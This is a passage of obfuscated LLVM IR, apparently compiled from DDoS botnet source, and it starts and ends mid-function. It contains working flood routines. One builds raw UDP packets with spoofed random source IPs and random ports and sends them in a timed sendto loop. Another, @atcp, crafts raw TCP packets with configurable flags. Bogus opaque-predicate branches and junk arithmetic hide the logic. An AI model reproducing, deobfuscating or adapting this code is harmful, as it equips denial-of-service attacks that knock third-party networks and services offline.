  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 0
  %454 = bitcast %union.anon.3* %453 to %struct.anon.4*
  %455 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %454, i32 0, i32 1
  store i16 %451, i16* %455, align 2
  %456 = call i32 @rand_cmwc()
  %457 = trunc i32 %456 to i16
  %458 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 3
  store i16 %457, i16* %459, align 4
  %460 = load i32, i32* %30, align 4
  %461 = call i32 @getRandomIP(i32 %460)
  %462 = call i32 @htonl(i32 %461) #9
  %463 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 8
  store i32 %462, i32* %464, align 4
  %465 = bitcast i8* %322 to i16*
  %466 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 2
  %468 = load i16, i16* %467, align 2
  %469 = zext i16 %468 to i32
  %470 = call zeroext i16 @csum(i16* %465, i32 %469)
  %471 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 7
  store i16 %470, i16* %472, align 2
  %473 = load i32, i32* %35, align 4
  %474 = load i32, i32* %22, align 4
  %475 = icmp eq i32 %473, %474
  br i1 %475, label %476, label %498

; <label>:476:                                    ; preds = %449
  %477 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %478 = load i32, i32* %34, align 4
  %479 = icmp sgt i32 %477, %478
  br i1 %479, label %480, label %481

; <label>:480:                                    ; preds = %476
  br label %501

; <label>:481:                                    ; preds = %476
  %482 = load i32, i32* @x.39
  %483 = load i32, i32* @y.40
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %481
  store i32 0, i32* %35, align 4
  %490 = load i32, i32* @x.39
  %491 = load i32, i32* @y.40
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %413

; <label>:498:                                    ; preds = %449
  %499 = load i32, i32* %35, align 4
  %500 = add i32 %499, 1
  store i32 %500, i32* %35, align 4
  br label %413

; <label>:501:                                    ; preds = %480
  %502 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %502)
  br label %503

; <label>:503:                                    ; preds = %501, %256, %234, %originalBBpart231, %128, %120, %77
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %504 = alloca i8*, align 8
  %505 = alloca i32, align 4
  %506 = alloca i32, align 4
  %507 = alloca i32, align 4
  %508 = alloca i32, align 4
  %509 = alloca i32, align 4
  %510 = alloca %struct.sockaddr_in, align 4
  %511 = alloca i32, align 4
  %512 = alloca i32, align 4
  %513 = alloca i8*, align 8
  %514 = alloca i32, align 4
  %515 = alloca i32, align 4
  %516 = alloca i32, align 4
  %517 = alloca i32, align 4
  %518 = alloca i32, align 4
  %519 = alloca i32, align 4
  %520 = alloca i8*, align 8
  %521 = alloca %struct.iphdr*, align 8
  %522 = alloca %struct.udphdr*, align 8
  %523 = alloca i32, align 4
  %524 = alloca i32, align 4
  store i8* %0, i8** %504, align 8
  store i32 %1, i32* %505, align 4
  store i32 %2, i32* %506, align 4
  store i32 %3, i32* %507, align 4
  store i32 %4, i32* %508, align 4
  store i32 %5, i32* %509, align 4
  %525 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %510, i32 0, i32 0
  store i16 2, i16* %525, align 4
  %526 = load i32, i32* %505, align 4
  %527 = icmp eq i32 %526, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %528 = call i32 @rand_cmwc()
  %529 = trunc i32 %528 to i16
  %530 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %529, i16* %530, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %531 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %532 = getelementptr inbounds [8 x i8], [8 x i8]* %531, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %532, i8 0, i64 8, i32 4, i1 false)
  %533 = load i32, i32* %20, align 4
  store i32 %533, i32* %22, align 4
  %534 = load i32, i32* %18, align 4
  %535 = icmp eq i32 %534, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %100
  %536 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %536, i32* %23, align 4
  %537 = load i32, i32* %23, align 4
  %538 = icmp ne i32 %537, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %139
  %539 = load i32, i32* %23, align 4
  %540 = load i8*, i8** %24, align 8
  %541 = load i32, i32* %19, align 4
  %542 = sext i32 %541 to i64
  %543 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %544 = call i64 @sendto(i32 %539, i8* %540, i64 %542, i32 0, %struct.sockaddr* %543, i32 16)
  %545 = load i32, i32* %26, align 4
  %546 = load i32, i32* %22, align 4
  %547 = icmp eq i32 %545, %546
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  %548 = load i32, i32* %26, align 4
  %_ = sub i32 0, %548
  %gen = add i32 %_, 1
  %_19 = sub i32 %548, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %548, 1
  %_22 = sub i32 0, %548
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %548, 1
  %gen25 = mul i32 %_24, 1
  %549 = add i32 %548, 1
  store i32 %549, i32* %26, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %197
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %214
  %550 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %550, i32* %27, align 4
  %551 = load i32, i32* %27, align 4
  %552 = icmp ne i32 %551, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %235
  store i32 1, i32* %28, align 4
  %553 = load i32, i32* %27, align 4
  %554 = bitcast i32* %28 to i8*
  %555 = call i32 @setsockopt(i32 %553, i32 0, i32 3, i8* %554, i32 4) #6
  %556 = icmp slt i32 %555, 0
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %257
  store i32 50, i32* %29, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %287
  %557 = load i32, i32* %18, align 4
  %_46 = sub i32 0, 32
  %gen47 = add i32 %_46, %557
  %558 = sub nsw i32 32, %557
  %_48 = shl i32 1, %558
  %_49 = sub i32 1, %558
  %gen50 = mul i32 %_49, %558
  %_51 = sub i32 1, %558
  %gen52 = mul i32 %_51, %558
  %_53 = sub i32 0, 1
  %gen54 = add i32 %_53, %558
  %_55 = sub i32 0, 1
  %gen56 = add i32 %_55, %558
  %_57 = sub i32 1, %558
  %gen58 = mul i32 %_57, %558
  %_59 = shl i32 1, %558
  %_60 = sub i32 1, %558
  %gen61 = mul i32 %_60, %558
  %_62 = sub i32 0, 1
  %gen63 = add i32 %_62, %558
  %559 = shl i32 1, %558
  %_64 = sub i32 %559, 1
  %gen65 = mul i32 %_64, 1
  %_66 = sub i32 0, %559
  %gen67 = add i32 %_66, 1
  %_68 = sub i32 %559, 1
  %gen69 = mul i32 %_68, 1
  %560 = sub nsw i32 %559, 1
  %_70 = shl i32 %560, -1
  %_71 = shl i32 %560, -1
  %561 = xor i32 %560, -1
  store i32 %561, i32* %30, align 4
  br label %originalBB45

originalBB75alteredBB:                            ; preds = %originalBB75, %309
  %562 = load i32, i32* %19, align 4
  %563 = sext i32 %562 to i64
  %_76 = sub i64 28, %563
  %gen77 = mul i64 %_76, %563
  %564 = add i64 28, %563
  %565 = call i8* @llvm.stacksave()
  store i8* %565, i8** %31, align 8
  %566 = alloca i8, i64 %564, align 16
  %567 = bitcast i8* %566 to %struct.iphdr*
  store %struct.iphdr* %567, %struct.iphdr** %32, align 8
  %568 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %569 = bitcast %struct.iphdr* %568 to i8*
  %570 = getelementptr i8, i8* %569, i64 20
  %571 = bitcast i8* %570 to %struct.udphdr*
  store %struct.udphdr* %571, %struct.udphdr** %33, align 8
  %572 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %574 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %573, i32 0, i32 0
  %575 = load i32, i32* %574, align 4
  %576 = load i32, i32* %30, align 4
  %577 = call i32 @getRandomIP(i32 %576)
  %578 = call i32 @htonl(i32 %577) #9
  %579 = load i32, i32* %19, align 4
  %580 = sext i32 %579 to i64
  %_78 = sub i64 0, 8
  %gen79 = add i64 %_78, %580
  %581 = add i64 8, %580
  %582 = trunc i64 %581 to i32
  call void @makeIPPacket(%struct.iphdr* %572, i32 %575, i32 %578, i8 zeroext 17, i32 %582)
  %583 = load i32, i32* %19, align 4
  %584 = sext i32 %583 to i64
  %_80 = sub i64 0, 8
  %gen81 = add i64 %_80, %584
  %_82 = sub i64 0, 8
  %gen83 = add i64 %_82, %584
  %_84 = sub i64 8, %584
  %gen85 = mul i64 %_84, %584
  %_86 = sub i64 8, %584
  %gen87 = mul i64 %_86, %584
  %585 = add i64 8, %584
  %586 = trunc i64 %585 to i16
  %587 = call zeroext i16 @htons(i16 zeroext %586) #9
  %588 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %589 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %588, i32 0, i32 0
  %590 = bitcast %union.anon.3* %589 to %struct.anon.4*
  %591 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %590, i32 0, i32 2
  store i16 %587, i16* %591, align 2
  %592 = call i32 @rand_cmwc()
  %593 = trunc i32 %592 to i16
  %594 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %595 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %594, i32 0, i32 0
  %596 = bitcast %union.anon.3* %595 to %struct.anon.4*
  %597 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %596, i32 0, i32 0
  store i16 %593, i16* %597, align 2
  %598 = load i32, i32* %16, align 4
  %599 = icmp eq i32 %598, 0
  br label %originalBB75

originalBB91alteredBB:                            ; preds = %originalBB91, %371
  %600 = trunc i32 %372 to i16
  %601 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %602 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %601, i32 0, i32 0
  %603 = bitcast %union.anon.3* %602 to %struct.anon.4*
  %604 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %603, i32 0, i32 1
  store i16 %600, i16* %604, align 2
  %605 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %606 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %605, i32 0, i32 0
  %607 = bitcast %union.anon.3* %606 to %struct.anon.4*
  %608 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %607, i32 0, i32 3
  store i16 0, i16* %608, align 2
  %609 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %610 = bitcast %struct.udphdr* %609 to i8*
  %611 = getelementptr inbounds i8, i8* %610, i64 8
  %612 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %611, i32 %612)
  %613 = bitcast i8* %322 to i16*
  %614 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %615 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %614, i32 0, i32 2
  %616 = load i16, i16* %615, align 2
  %617 = zext i16 %616 to i32
  %618 = call zeroext i16 @csum(i16* %613, i32 %617)
  %619 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %620 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %619, i32 0, i32 7
  store i16 %618, i16* %620, align 2
  %621 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %622 = load i32, i32* %17, align 4
  %_92 = shl i32 %621, %622
  %_93 = shl i32 %621, %622
  %_94 = sub i32 %621, %622
  %gen95 = mul i32 %_94, %622
  %_96 = shl i32 %621, %622
  %623 = add nsw i32 %621, %622
  store i32 %623, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %originalBB91

originalBB100alteredBB:                           ; preds = %originalBB100, %426
  %624 = call i32 @rand_cmwc()
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %481
  store i32 0, i32* %35, align 4
  br label %originalBB104
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.41
  %9 = load i32, i32* @y.42
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.41
  %39 = load i32, i32* @y.42
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %50

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %48, i16* %49, align 2
  br label %55

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %17, align 4
  %52 = trunc i32 %51 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #9
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %53, i16* %54, align 2
  br label %55

; <label>:55:                                     ; preds = %50, %46
  %56 = load i32, i32* @x.41
  %57 = load i32, i32* @y.42
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %16, align 8
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %66 = call i32 @getHost(i8* %64, %struct.in_addr* %65)
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.41
  %69 = load i32, i32* @y.42
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %67, label %76, label %77

; <label>:76:                                     ; preds = %originalBBpart24
  br label %572

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = load i32, i32* @x.41
  %79 = load i32, i32* @y.42
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %87 = getelementptr inbounds [8 x i8], [8 x i8]* %86, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %87, i8 0, i64 8, i32 4, i1 false)
  %88 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %88, i32* %25, align 4
  %89 = load i32, i32* %25, align 4
  %90 = icmp ne i32 %89, 0
  %91 = load i32, i32* @x.41
  %92 = load i32, i32* @y.42
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %90, label %116, label %99

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = load i32, i32* @x.41
  %101 = load i32, i32* @y.42
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = load i32, i32* @x.41
  %109 = load i32, i32* @y.42
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %572

; <label>:116:                                    ; preds = %originalBBpart28
  store i32 1, i32* %26, align 4
  %117 = load i32, i32* %25, align 4
  %118 = bitcast i32* %26 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp slt i32 %119, 0
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %116
  br label %572

; <label>:122:                                    ; preds = %116
  %123 = load i32, i32* @x.41
  %124 = load i32, i32* @y.42
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %122
  %131 = load i32, i32* %19, align 4
  %132 = icmp eq i32 %131, 0
  %133 = load i32, i32* @x.41
  %134 = load i32, i32* @y.42
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %132, label %141, label %142

; <label>:141:                                    ; preds = %originalBBpart216
  store i32 0, i32* %27, align 4
  br label %164

; <label>:142:                                    ; preds = %originalBBpart216
  %143 = load i32, i32* @x.41
  %144 = load i32, i32* @y.42
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i32, i32* %19, align 4
  %152 = sub nsw i32 32, %151
  %153 = shl i32 1, %152
  %154 = sub nsw i32 %153, 1
  %155 = xor i32 %154, -1
  store i32 %155, i32* %27, align 4
  %156 = load i32, i32* @x.41
  %157 = load i32, i32* @y.42
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart262, label %originalBB18alteredBB

originalBBpart262:                                ; preds = %originalBB18
  br label %164

; <label>:164:                                    ; preds = %originalBBpart262, %141
  %165 = load i32, i32* @x.41
  %166 = load i32, i32* @y.42
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %164
  %173 = load i32, i32* %21, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 40, %174
  %176 = call i8* @llvm.stacksave()
  store i8* %176, i8** %28, align 8
  %177 = alloca i8, i64 %175, align 16
  %178 = bitcast i8* %177 to %struct.iphdr*
  store %struct.iphdr* %178, %struct.iphdr** %29, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = bitcast %struct.iphdr* %179 to i8*
  %181 = getelementptr i8, i8* %180, i64 20
  %182 = bitcast i8* %181 to %struct.tcphdr*
  store %struct.tcphdr* %182, %struct.tcphdr** %30, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 4
  %187 = load i32, i32* %27, align 4
  %188 = call i32 @getRandomIP(i32 %187)
  %189 = call i32 @htonl(i32 %188) #9
  %190 = load i32, i32* %21, align 4
  %191 = sext i32 %190 to i64
  %192 = add i64 20, %191
  %193 = trunc i64 %192 to i32
  call void @makeIPPacket(%struct.iphdr* %183, i32 %186, i32 %189, i8 zeroext 6, i32 %193)
  %194 = call i32 @rand_cmwc()
  %195 = trunc i32 %194 to i16
  %196 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.1* %197 to %struct.anon.2*
  %199 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %198, i32 0, i32 0
  store i16 %195, i16* %199, align 4
  %200 = call i32 @rand_cmwc()
  %201 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.1* %202 to %struct.anon.2*
  %204 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %203, i32 0, i32 2
  store i32 %200, i32* %204, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.1* %206 to %struct.anon.2*
  %208 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %207, i32 0, i32 3
  store i32 0, i32* %208, align 4
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.1* %210 to %struct.anon.2*
  %212 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -241
  %215 = or i16 %214, 80
  store i16 %215, i16* %212, align 4
  %216 = load i8*, i8** %20, align 8
  %217 = call i32 @strcmp(i8* %216, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %218 = icmp ne i32 %217, 0
  %219 = load i32, i32* @x.41
  %220 = load i32, i32* @y.42
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart2104, label %originalBB64alteredBB

originalBBpart2104:                               ; preds = %originalBB64
  br i1 %218, label %279, label %227

; <label>:227:                                    ; preds = %originalBBpart2104
  %228 = load i32, i32* @x.41
  %229 = load i32, i32* @y.42
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.1* %237 to %struct.anon.2*
  %239 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %240, -513
  %242 = or i16 %241, 512
  store i16 %242, i16* %239, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.1* %244 to %struct.anon.2*
  %246 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %247, -1025
  %249 = or i16 %248, 1024
  store i16 %249, i16* %246, align 4
  %250 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.1* %251 to %struct.anon.2*
  %253 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -257
  %256 = or i16 %255, 256
  store i16 %256, i16* %253, align 4
  %257 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 0
  %259 = bitcast %union.anon.1* %258 to %struct.anon.2*
  %260 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %261, -4097
  %263 = or i16 %262, 4096
  store i16 %263, i16* %260, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.1* %265 to %struct.anon.2*
  %267 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %268, -2049
  %270 = or i16 %269, 2048
  store i16 %270, i16* %267, align 4
  %271 = load i32, i32* @x.41
  %272 = load i32, i32* @y.42
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart2177, label %originalBB106alteredBB

originalBBpart2177:                               ; preds = %originalBB106
  br label %417

; <label>:279:                                    ; preds = %originalBBpart2104
  %280 = load i8*, i8** %20, align 8
  %281 = call i8* @strtok(i8* %280, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %281, i8** %31, align 8
  br label %282

; <label>:282:                                    ; preds = %originalBBpart2219, %279
  %283 = load i8*, i8** %31, align 8
  %284 = icmp ne i8* %283, null
  br i1 %284, label %285, label %416

; <label>:285:                                    ; preds = %282
  %286 = load i8*, i8** %31, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %297, label %289

; <label>:289:                                    ; preds = %285
  %290 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
